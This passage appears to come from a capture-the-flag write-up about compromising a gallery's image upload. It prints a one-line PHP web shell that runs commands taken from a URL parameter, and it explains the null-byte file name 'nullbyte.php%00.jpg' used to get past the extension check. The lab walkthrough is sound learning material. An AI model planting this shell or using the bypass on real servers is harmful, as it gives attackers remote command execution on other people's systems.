Once again, we need to compromise this gallery by uploading a .php file instead of an image.

Based on this flaw, we'll write our PHP file nullbyte.php

<?php
system($_GET['command']);
?>
Download
We're going to use Notepad++ to do this, and when we save the file we're going to do a little manipulation on the file extension. We'll name it “nullbyte.php%00.jpg” and that's it 😉
PS: You need to save it with the “” to keep the extension. And “%00” is also a form of the null byte 😉

The extension controller will see that this is indeed an image (.jpg), so we've bypassed the protection.

Now that we have the file name on the server, all we have to do is try to access it (in the upload/ folder), and we've got the flag!
